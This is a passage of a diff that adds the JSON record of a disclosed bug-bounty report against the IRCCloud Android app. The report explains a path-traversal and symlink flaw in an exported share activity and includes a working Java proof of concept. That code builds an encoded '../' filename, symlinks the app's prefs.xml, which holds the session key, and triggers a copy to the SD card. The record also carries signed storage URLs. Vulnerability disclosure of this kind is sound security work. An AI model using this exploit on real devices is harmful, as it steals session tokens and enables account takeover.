+            "id": 2590505, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bagipro", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bagipro", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/052/239/4da99970bfc1e4897f003883d05dc8acfec556ef_small.jpg?1510530490"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 46, 
+        "name": "Privacy Violation"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -30784223.173339676, 
+    "disclosed_at": "2017-11-15T15:23:32.609Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/288955", 
+    "created_at": "2017-11-09T20:52:38.854Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h1 id=\"bug-description\">Bug description</h1>\n\n<p>Hi, I&#39;d like to report a vulnerability which allows to theft arbitrary protected files (and as a result takeover account, because all tokens will be leaked), similar to my bug reported to Harvest <a title=\"https://hackerone.com/reports/161710\" href=\"https://hackerone.com/reports/161710\">https://hackerone.com/reports/161710</a></p>\n\n<p>This one is really tricky, passed two days to realize how to exploit that ;)</p>\n\n<p>Activity <code>com.irccloud.android.activity.ShareChooserActivity</code> is exported and designed to allow file sharing from third-party apps to IRC Cloud</p>\n<pre class=\"highlight xml\"><code>        <span class=\"nt\">&lt;activity</span> <span class=\"na\">android:excludeFromRecents=</span><span class=\"s\">&quot;true&quot;</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;com.irccloud.android.activity.ShareChooserActivity&quot;</span> <span class=\"na\">android:theme=</span><span class=\"s\">&quot;@style/dawnDialog&quot;</span><span class=\"nt\">&gt;</span>\n            <span class=\"nt\">&lt;intent-filter&gt;</span>\n                <span class=\"nt\">&lt;action</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.action.VIEW&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.DEFAULT&quot;</span><span class=\"nt\">/&gt;</span>\n            <span class=\"nt\">&lt;/intent-filter&gt;</span>\n            <span class=\"nt\">&lt;intent-filter&gt;</span>\n                <span class=\"nt\">&lt;action</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.action.SEND&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.DEFAULT&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;data</span> <span class=\"na\">android:mimeType=</span><span class=\"s\">&quot;application/*&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;data</span> <span class=\"na\">android:mimeType=</span><span class=\"s\">&quot;audio/*&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;data</span> <span class=\"na\">android:mimeType=</span><span class=\"s\">&quot;image/*&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;data</span> <span class=\"na\">android:mimeType=</span><span class=\"s\">&quot;text/*&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;data</span> <span class=\"na\">android:mimeType=</span><span class=\"s\">&quot;video/*&quot;</span><span class=\"nt\">/&gt;</span>\n            <span class=\"nt\">&lt;/intent-filter&gt;</span>\n            <span class=\"nt\">&lt;meta-data</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.service.chooser.chooser_target_service&quot;</span> <span class=\"na\">android:value=</span><span class=\"s\">&quot;.ConversationChooserTargetService&quot;</span><span class=\"nt\">/&gt;</span>\n        <span class=\"nt\">&lt;/activity&gt;</span>\n</code></pre><pre class=\"highlight java\"><code>    <span class=\"kd\">protected</span> <span class=\"kt\">void</span> <span class=\"nf\">onResume</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"c1\">//...</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">getSharedPreferences</span><span class=\"o\">(</span><span class=\"s\">&quot;prefs&quot;</span><span class=\"o\">,</span> <span class=\"mi\">0</span><span class=\"o\">).</span><span class=\"na\">getString</span><span class=\"o\">(</span><span class=\"s\">&quot;session_key&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;&quot;</span><span class=\"o\">).</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"c1\">//...</span>\n                <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">mUri</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">Uri</span><span class=\"o\">)</span> <span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getParcelableExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;android.intent.extra.STREAM&quot;</span><span class=\"o\">);</span> <span class=\"c1\">// getting attacker provided uri</span>\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">mUri</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">mUri</span> <span class=\"o\">=</span> <span class=\"n\">MainActivity</span><span class=\"o\">.</span><span class=\"na\">makeTempCopy</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">mUri</span><span class=\"o\">,</span> <span class=\"k\">this</span><span class=\"o\">);</span> <span class=\"c1\">// copying file from this uri to /data/data/com.irccloud.android/cache/</span>\n                <span class=\"o\">}</span>\n</code></pre><pre class=\"highlight java\"><code>    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"n\">Uri</span> <span class=\"nf\">makeTempCopy</span><span class=\"o\">(</span><span class=\"n\">Uri</span> <span class=\"n\">fileUri</span><span class=\"o\">,</span> <span class=\"n\">Context</span> <span class=\"n\">context</span><span class=\"o\">,</span> <span class=\"n\">String</span> <span class=\"n\">original_filename</span><span class=\"o\">)</span> <span class=\"o\">{</span> <span class=\"c1\">// original_filename = mUri.getLastPathSegment()</span>\n        <span class=\"c1\">//...</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"n\">Uri</span> <span class=\"n\">out</span> <span class=\"o\">=</span> <span class=\"n\">Uri</span><span class=\"o\">.</span><span class=\"na\">fromFile</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">File</span><span class=\"o\">(</span><span class=\"n\">context</span><span class=\"o\">.</span><span class=\"na\">getCacheDir</span><span class=\"o\">(),</span> <span class=\"n\">original_filename</span><span class=\"o\">));</span>\n            <span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">d</span><span class=\"o\">(</span><span class=\"s\">&quot;IRCCloud&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;Copying file to &quot;</span> <span class=\"o\">+</span> <span class=\"n\">out</span><span class=\"o\">);</span>\n            <span class=\"n\">InputStream</span> <span class=\"n\">is</span> <span class=\"o\">=</span> <span class=\"n\">IRCCloudApplication</span><span class=\"o\">.</span><span class=\"na\">getInstance</span><span class=\"o\">().</span><span class=\"na\">getApplicationContext</span><span class=\"o\">().</span><span class=\"na\">getContentResolver</span><span class=\"o\">().</span><span class=\"na\">openInputStream</span><span class=\"o\">(</span><span class=\"n\">fileUri</span><span class=\"o\">);</span>\n            <span class=\"n\">OutputStream</span> <span class=\"n\">os</span> <span class=\"o\">=</span> <span class=\"n\">IRCCloudApplication</span><span class=\"o\">.</span><span class=\"na\">getInstance</span><span class=\"o\">().</span><span class=\"na\">getApplicationContext</span><span class=\"o\">().</span><span class=\"na\">getContentResolver</span><span class=\"o\">().</span><span class=\"na\">openOutputStream</span><span class=\"o\">(</span><span class=\"n\">out</span><span class=\"o\">);</span>\n            <span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"n\">buffer</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">byte</span><span class=\"o\">[</span><span class=\"mi\">8192</span><span class=\"o\">];</span>\n            <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"kt\">int</span> <span class=\"n\">len</span> <span class=\"o\">=</span> <span class=\"n\">is</span><span class=\"o\">.</span><span class=\"na\">read</span><span class=\"o\">(</span><span class=\"n\">buffer</span><span class=\"o\">);</span>\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">len</span> <span class=\"o\">!=</span> <span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"n\">os</span><span class=\"o\">.</span><span class=\"na\">write</span><span class=\"o\">(</span><span class=\"n\">buffer</span><span class=\"o\">,</span> <span class=\"mi\">0</span><span class=\"o\">,</span> <span class=\"n\">len</span><span class=\"o\">);</span>\n                <span class=\"c1\">//...</span>\n</code></pre>\n<p>It means that the specified file will be copied to <code>/data/data/com.irccloud.android/cache/</code> with original name. Original name is <code>getLastPathSegment()</code> from the specified uri. But there is one thing: this method decodes last path segment. This is my PoC:</p>\n<pre class=\"highlight java\"><code>    <span class=\"o\">[</span><span class=\"nd\">@Override</span><span class=\"o\">](/</span><span class=\"n\">override</span><span class=\"o\">)</span>\n    <span class=\"kd\">protected</span> <span class=\"kt\">void</span> <span class=\"nf\">onCreate</span><span class=\"o\">(</span><span class=\"n\">Bundle</span> <span class=\"n\">savedInstanceState</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">onCreate</span><span class=\"o\">(</span><span class=\"n\">savedInstanceState</span><span class=\"o\">);</span>\n        <span class=\"n\">setContentView</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">layout</span><span class=\"o\">.</span><span class=\"na\">activity_main</span><span class=\"o\">);</span>\n\n        <span class=\"c1\">// path to sdcard (encoded relative path from &quot;/data/data/com.irccloud.android/cache/&quot;)</span>\n        <span class=\"n\">String</span> <span class=\"n\">zhk</span> <span class=\"o\">=</span> <span class=\"s\">&quot;..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml&quot;</span><span class=\"o\">;</span>\n        <span class=\"c1\">// absolute path to a file, pointing to sumlink</span>\n        <span class=\"n\">String</span> <span class=\"n\">appDir</span> <span class=\"o\">=</span> <span class=\"s\">&quot;/data/data/&quot;</span> <span class=\"o\">+</span> <span class=\"n\">getPackageName</span><span class=\"o\">();</span>\n        <span class=\"n\">String</span> <span class=\"n\">deepPath</span> <span class=\"o\">=</span> <span class=\"n\">appDir</span> <span class=\"o\">+</span> <span class=\"s\">&quot;/x/x/x/x/&quot;</span><span class=\"o\">;</span>\n\n        <span class=\"k\">new</span> <span class=\"nf\">File</span><span class=\"o\">(</span><span class=\"n\">deepPath</span><span class=\"o\">).</span><span class=\"na\">mkdirs</span><span class=\"o\">();</span>\n\n        <span class=\"n\">String</span> <span class=\"n\">sumlink</span> <span class=\"o\">=</span> <span class=\"n\">deepPath</span> <span class=\"o\">+</span> <span class=\"n\">zhk</span><span class=\"o\">;</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"n\">File</span> <span class=\"n\">sumlinkFile</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">File</span><span class=\"o\">(</span><span class=\"n\">Uri</span><span class=\"o\">.</span><span class=\"na\">decode</span><span class=\"o\">(</span><span class=\"n\">sumlink</span><span class=\"o\">)).</span><span class=\"na\">getCanonicalFile</span><span class=\"o\">();</span>\n            <span class=\"n\">sumlinkFile</span><span class=\"o\">.</span><span class=\"na\">getParentFile</span><span class=\"o\">().</span><span class=\"na\">mkdirs</span><span class=\"o\">();</span>\n\n            <span class=\"n\">Runtime</span><span class=\"o\">.</span><span class=\"na\">getRuntime</span><span class=\"o\">().</span><span class=\"na\">exec</span><span class=\"o\">(</span><span class=\"s\">&quot;ln -s /data/data/com.irccloud.android/shared_prefs/prefs.xml &quot;</span>\n                    <span class=\"o\">+</span> <span class=\"n\">sumlinkFile</span><span class=\"o\">.</span><span class=\"na\">getAbsolutePath</span><span class=\"o\">()).</span><span class=\"na\">waitFor</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">catch</span><span class=\"o\">(</span><span class=\"n\">Exception</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// should be never thrown</span>\n            <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">RuntimeException</span><span class=\"o\">(</span><span class=\"n\">e</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">grant777PermissionToEverything</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">File</span><span class=\"o\">(</span><span class=\"n\">appDir</span><span class=\"o\">));</span>\n\n        <span class=\"n\">Uri</span> <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"n\">Uri</span><span class=\"o\">.</span><span class=\"na\">parse</span><span class=\"o\">(</span><span class=\"s\">&quot;file://&quot;</span> <span class=\"o\">+</span> <span class=\"n\">sumlink</span><span class=\"o\">);</span> <span class=\"c1\">// file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml</span>\n\n        <span class=\"n\">Intent</span> <span class=\"n\">intent</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">();</span>\n        <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">setClassName</span><span class=\"o\">(</span><span class=\"s\">&quot;com.irccloud.android&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;com.irccloud.android.activity.ShareChooserActivity&quot;</span><span class=\"o\">);</span>\n        <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;android.intent.extra.STREAM&quot;</span><span class=\"o\">,</span> <span class=\"n\">uri</span><span class=\"o\">);</span>\n        <span class=\"n\">startActivity</span><span class=\"o\">(</span><span class=\"n\">intent</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">grant777PermissionToEverything</span><span class=\"o\">(</span><span class=\"n\">File</span> <span class=\"n\">dist</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">dist</span><span class=\"o\">.</span><span class=\"na\">setReadable</span><span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">);</span>\n        <span class=\"n\">dist</span><span class=\"o\">.</span><span class=\"na\">setWritable</span><span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">);</span>\n        <span class=\"n\">dist</span><span class=\"o\">.</span><span class=\"na\">setExecutable</span><span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span><span class=\"o\">(</span><span class=\"n\">dist</span><span class=\"o\">.</span><span class=\"na\">isDirectory</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n            <span class=\"k\">for</span><span class=\"o\">(</span><span class=\"n\">File</span> <span class=\"n\">child</span> <span class=\"o\">:</span> <span class=\"n\">dist</span><span class=\"o\">.</span><span class=\"na\">listFiles</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n                <span class=\"n\">grant777PermissionToEverything</span><span class=\"o\">(</span><span class=\"n\">child</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n</code></pre>\n<p>Result:<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_2017-11-09-23-21-21.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/238/129/0ba86673ab2ad09bcf1133e57c595a36252db0e7/Screenshot_2017-11-09-23-21-21.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222938Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f4fc1776282bd210cd9d908a4ac3e1cb70147937f514a23b4968ad9d0ba1fc1b\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/238/129/0ba86673ab2ad09bcf1133e57c595a36252db0e7/Screenshot_2017-11-09-23-21-21.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222938Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f4fc1776282bd210cd9d908a4ac3e1cb70147937f514a23b4968ad9d0ba1fc1b\" class=\"markdown-inline-image\"></a><br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_2017-11-09-23-21-29.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/238/128/02be786d66ef5a7bc15aee4a7e1e42f1db8c5768/Screenshot_2017-11-09-23-21-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222938Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f7041a49344daccfe30eb3df9cc82679a2041b0775dd11f31dbcd5147ae5e49f\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/238/128/02be786d66ef5a7bc15aee4a7e1e42f1db8c5768/Screenshot_2017-11-09-23-21-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222938Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f7041a49344daccfe30eb3df9cc82679a2041b0775dd11f31dbcd5147ae5e49f\" class=\"markdown-inline-image\"></a></p>\n\n<p>It works so:<br>\n1) I start your activity with the following uri: <code>file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml</code><br>\n2) Canonical file from #2 (<code>/data/data/com.attacker/sdcard/prefs.xml</code>) is a symlink file pointing to the file I want to theft (<code>/data/data/com.irccloud.android/shared_prefs/prefs.xml</code>)<br>\n3) In your app <code>original_filename</code> is equal to <code>../../../../sdcard/prefs.xml</code><br>\n4) </p>\n<pre class=\"highlight java\"><code><span class=\"n\">InputStream</span> <span class=\"n\">is</span> <span class=\"o\">=</span> <span class=\"n\">IRCCloudApplication</span><span class=\"o\">.</span><span class=\"na\">getInstance</span><span class=\"o\">().</span><span class=\"na\">getApplicationContext</span><span class=\"o\">().</span><span class=\"na\">getContentResolver</span><span class=\"o\">().</span><span class=\"na\">openInputStream</span><span class=\"o\">(</span><span class=\"n\">fileUri</span><span class=\"o\">);</span>\n</code></pre>\n<p>But <code>openInputStream(...)</code> automatically decodes the specified uri. So it will access my symlink file which points to <code>/data/data/com.irccloud.android/shared_prefs/prefs.xml</code><br>\n5) </p>\n<pre class=\"highlight java\"><code><span class=\"n\">Uri</span> <span class=\"n\">out</span> <span class=\"o\">=</span> <span class=\"n\">Uri</span><span class=\"o\">.</span><span class=\"na\">fromFile</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">File</span><span class=\"o\">(</span><span class=\"n\">context</span><span class=\"o\">.</span><span class=\"na\">getCacheDir</span><span class=\"o\">(),</span> <span class=\"n\">original_filename</span><span class=\"o\">));</span>\n<span class=\"n\">OutputStream</span> <span class=\"n\">os</span> <span class=\"o\">=</span> <span class=\"n\">IRCCloudApplication</span><span class=\"o\">.</span><span class=\"na\">getInstance</span><span class=\"o\">().</span><span class=\"na\">getApplicationContext</span><span class=\"o\">().</span><span class=\"na\">getContentResolver</span><span class=\"o\">().</span><span class=\"na\">openOutputStream</span><span class=\"o\">(</span><span class=\"n\">out</span><span class=\"o\">);</span>\n</code></pre>\n<p>It is equal to </p>\n<pre class=\"highlight java\"><code><span class=\"n\">Uri</span> <span class=\"n\">out</span> <span class=\"o\">=</span> <span class=\"n\">Uri</span><span class=\"o\">.</span><span class=\"na\">fromFile</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">File</span><span class=\"o\">(</span><span class=\"s\">&quot;/data/data/com.irccloud.android/cache/&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;../../../../sdcard/prefs.xml&quot;</span><span class=\"o\">));</span>\n</code></pre>\n<p>So it simply outputs the specified file to Sd card.</p>\n\n<h1 id=\"how-to-fix\">How to fix</h1>\n\n<p>Just specify e.g. current timestamp as a file name, but don&#39;t use provided by attacker. In current implementation attacker can force IRC Cloud app to copy arbitrary files to arbitrary directories. File <code>/data/data/com.irccloud.android/shared_prefs/prefs.xml</code> contains <code>session_key</code>. In normal situation this file is accessible only to IRC Cloud app. But when it&#39;s copied to e.g. Sd card it will be accessible to everyone. But Sd card is only simple example. Attacker can also force IRC Cloud app to copy a file to its internal directory.</p>\n\n<p>BTW this vulnerability also allows to overwrite arbitrary files. So attacker also can replace any your protected files and substitute for example history.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.irccloud.com", 
+            "about": "Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message.", 
+            "twitter_handle": "irccloud", 
+            "name": "IRCCloud"
+        }, 
+        "handle": "irccloud", 
+        "url": "https://hackerone.com/irccloud", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/140/09194dde3d6edd86ef8ce84ce7f9c277a953e1b7_small.png?1397053347", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/140/5cf4f659a47ba7cb2c48a391465795c07e2ae926_medium.png?1397053347"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 140, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
